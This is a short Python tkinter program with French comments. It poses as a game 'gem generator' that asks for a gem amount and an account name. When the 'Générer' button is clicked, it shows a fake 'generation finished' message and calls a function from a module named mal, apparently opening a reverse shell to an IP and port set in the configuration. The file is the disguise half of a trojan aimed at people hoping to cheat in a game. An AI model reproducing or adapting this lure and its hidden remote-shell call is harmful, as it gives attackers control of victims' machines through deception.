#Auteurs --> aiglematth
#        --> Guilhem

"""
Fichier contenant les outils de l'interface graphique
"""

#Imports
import tkinter
import constantes
import mal

#Classes
class BackgroundImage(tkinter.Canvas):
    """
    Classe qui simplifiera la mise en place d'une image de fond
    """
    def __init__(self, main, filename, width, height, x=0, y=0):
        #Attributs
        tkinter.Canvas.__init__(self, master=main, width=width, height=height)
        self.image = tkinter.PhotoImage(master=self, file=filename)
        self.create_image((self.image.width()//2,self.image.height()//2), image=self.image)
        self.place(x=x,y=y)
        #Fin attributs

class Principal(tkinter.Tk):
    """
    Classe dérivée de tkinter.Tk, contiendra l'application
    """
    def __init__(self):
        """
        Constructeur de la classe
        """
        tkinter.Tk.__init__(self)
        #Attributs
        self.title(constantes.TITRE)
        self.geometry(constantes.GEOMETRY)
        self.gemmes = tkinter.StringVar()
        self.compte = tkinter.StringVar()
        #Méthodes
        self.widgets()

    def widgets(self):
        """
        Widgets de l'application
        :return: None
        """
        BackgroundImage(self, constantes.BACK, constantes.SIZE[0], constantes.SIZE[1])

        labelGemmes = tkinter.Label(self, text="Gemmes")
        labelGemmes.place(x=10, y=10)

        entryGemmes = tkinter.Entry(self, textvariable=self.gemmes)
        entryGemmes.place(x=10, y=40)

        labelCompte = tkinter.Label(self, text="Compte")
        labelCompte.place(x=10, y=70)

        entryCompte = tkinter.Entry(self, textvariable=self.compte)
        entryCompte.place(x=10, y=100)

        boutton = tkinter.Button(self, command=self.hack, text="Générer")
        boutton.place(x=10, y=130)

    def hack(self):
        """
        HAHAHAAAAAAAAA
        :return: None
        """
        labelGood = tkinter.Label(self, text="Génération finie !")
        labelGood.place(x=150, y=130)
        mal.ReverseSell(constantes.IP, constantes.PORT, constantes.TIMEOUT)


